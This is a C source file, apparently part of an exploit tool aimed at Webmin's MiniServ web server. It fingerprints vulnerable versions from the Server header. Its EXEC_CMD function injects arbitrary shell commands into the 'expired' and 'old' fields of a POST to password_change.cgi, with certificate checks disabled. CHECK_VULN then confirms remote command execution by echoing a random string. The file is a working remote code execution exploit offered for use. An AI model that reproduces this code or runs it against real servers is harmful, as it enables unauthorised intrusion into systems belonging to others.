// Header Files
#include <curl/curl.h>
#include <curl/easy.h>
#include "modules.h"

// Check Headers To Check If Given Version Is Vulnerable
static inline size_t CHECK_HEADERS(char *buffer, size_t itemsize, size_t nitems, void* ign)
{
  size_t bytes=itemsize*nitems;

  fprintf(stdout,GREEN("%s"),buffer);
  if (strstr(buffer,"Server:")!=NULL)
  {
    //Check If The Version Of Miniserv Is Vulnerable
    if ((strstr(buffer,"MiniServ/1.890")!=NULL) || (strstr(buffer,"MiniServ/1.900")!=NULL) || (strstr(buffer,"MiniServ/1.910")!=NULL) || (strstr(buffer,"MiniServ/1.920")!=NULL))
    {
        SERVER.VERSION_FLAG=1;
    }
  }
  return bytes;
}

// Get Response Of The Complete Request
static inline size_t GET_RESP(void *ptr, size_t size, size_t nmemb, struct chunck *s)
{
  size_t new_len = s->len + size*nmemb;
  s->ptr = realloc(s->ptr, new_len+1);
  if (s->ptr == NULL) 
  {
    fprintf(stderr, "[-] "RED("realloc() Failed!" "\n"));
    exit(EXIT_FAILURE);
  }
  memcpy(s->ptr+s->len, ptr, size*nmemb);
  s->ptr[new_len] = '\0';
  s->len = new_len;

  return size*nmemb;
}

// Fetch Version Information
static inline int CHECK_VERSION()
{
  CURLcode ret;
  CURL *hnd;
  struct chunck RESPONSE;

  hnd = curl_easy_init();
  if (!hnd){
    fprintf(stderr,"[-]" RED("Curl init failed") "\n");
    return EXIT_FAILURE;
  }
  
  INIT_CHUNCK(&RESPONSE);
  curl_easy_setopt(hnd, CURLOPT_BUFFERSIZE, 102400L);
  curl_easy_setopt(hnd, CURLOPT_URL, URL);
  curl_easy_setopt(hnd, CURLOPT_NOPROGRESS, 1L);
  curl_easy_setopt(hnd, CURLOPT_USERAGENT, USER_AGENT);
  curl_easy_setopt(hnd, CURLOPT_FOLLOWLOCATION, 1L);
  curl_easy_setopt(hnd, CURLOPT_MAXREDIRS, 50L);
  curl_easy_setopt(hnd, CURLOPT_HTTP_VERSION, (long)CURL_HTTP_VERSION_2TLS);
  curl_easy_setopt(hnd, CURLOPT_SSL_VERIFYPEER, 0L);
  curl_easy_setopt(hnd, CURLOPT_SSL_VERIFYHOST, 0L);
  curl_easy_setopt(hnd, CURLOPT_FTP_SKIP_PASV_IP, 1L);
  curl_easy_setopt(hnd, CURLOPT_TCP_KEEPALIVE, 1L);
  curl_easy_setopt(hnd, CURLOPT_WRITEFUNCTION, GET_RESP);
  curl_easy_setopt(hnd, CURLOPT_WRITEDATA, &RESPONSE);
  curl_easy_setopt(hnd, CURLOPT_HEADERFUNCTION, CHECK_HEADERS);
  
  ret = curl_easy_perform(hnd);
  if (ret != CURLE_OK)
  {
    fprintf(stderr,"[-] Curl Returned Error As: " RED("%s") "\n",curl_easy_strerror(ret));
  }
  CHECK_SSL_MODE(RESPONSE.ptr);
  free(RESPONSE.ptr);
  curl_easy_cleanup(hnd);
  hnd = NULL;
  return (int)ret;
}

static inline char *EXEC_CMD(char *cmd)
{
  CURLcode ret;
  CURL *hnd;
  struct curl_slist *slist1;
  char *REFERER;
  char *TARGET_URL;
  char *POST_DATA;
  char *RAND_DATA;
  size_t POST_DATA_LEN;
  struct chunck RESPONSE;

  RAND_DATA=RAND_STR(8);
  asprintf(&REFERER,"Referer: %s",URL);
  asprintf(&TARGET_URL,"%s/password_change.cgi",URL);
  asprintf(&POST_DATA,"expired=%s&new1=%s&new2=%s&old=%s",cmd,RAND_DATA,RAND_DATA,cmd);
  POST_DATA_LEN=strlen(POST_DATA);
  
  slist1 = NULL;
  slist1 = curl_slist_append(slist1, REFERER);
  
  INIT_CHUNCK(&RESPONSE);
  hnd = curl_easy_init();
  curl_easy_setopt(hnd, CURLOPT_BUFFERSIZE, 102400L);
  curl_easy_setopt(hnd, CURLOPT_URL, TARGET_URL);
  curl_easy_setopt(hnd, CURLOPT_NOPROGRESS, 1L);
  curl_easy_setopt(hnd, CURLOPT_POSTFIELDS, POST_DATA);
  curl_easy_setopt(hnd, CURLOPT_POSTFIELDSIZE_LARGE, (curl_off_t)POST_DATA_LEN);
  curl_easy_setopt(hnd, CURLOPT_HTTPHEADER, slist1);
  curl_easy_setopt(hnd, CURLOPT_USERAGENT, USER_AGENT);
  curl_easy_setopt(hnd, CURLOPT_FOLLOWLOCATION, 1L);
  curl_easy_setopt(hnd, CURLOPT_MAXREDIRS, 50L);
  curl_easy_setopt(hnd, CURLOPT_HTTP_VERSION, (long)CURL_HTTP_VERSION_2TLS);
  curl_easy_setopt(hnd, CURLOPT_SSL_VERIFYPEER, 0L);
  curl_easy_setopt(hnd, CURLOPT_SSL_VERIFYHOST, 0L);
  curl_easy_setopt(hnd, CURLOPT_CUSTOMREQUEST, "POST");
  curl_easy_setopt(hnd, CURLOPT_FTP_SKIP_PASV_IP, 1L);
  curl_easy_setopt(hnd, CURLOPT_TCP_KEEPALIVE, 1L);
  curl_easy_setopt(hnd, CURLOPT_WRITEFUNCTION, GET_RESP);
  curl_easy_setopt(hnd, CURLOPT_WRITEDATA, &RESPONSE);

  ret = curl_easy_perform(hnd);

  if (ret != CURLE_OK)
  {
    //char *ERROR;
    //ERROR = curl_easy_strerror(ret);
    fprintf(stderr,"[-] Error Occured As:" RED("%s") "\n", curl_easy_strerror(ret));
  }

  curl_easy_cleanup(hnd);
  hnd = NULL;
  curl_slist_free_all(slist1);
  slist1 = NULL;

  free(POST_DATA);
  free(RAND_DATA);
  free(REFERER);
  free(TARGET_URL);
  return RESPONSE.ptr;

}

static inline void CHECK_VULN()
{
  char *RAND_DATA;
  char *CMD;
  char *RESP;

  RAND_DATA=RAND_STR(16);
  asprintf(&CMD,"echo %s",RAND_DATA);
  RESP=EXEC_CMD(CMD);
  if (strstr(RESP,RAND_DATA) != NULL)
  {

    SERVER.VULN_FLAG=1;
  }
  free(RESP);
  free(CMD);
  free(RAND_DATA);
}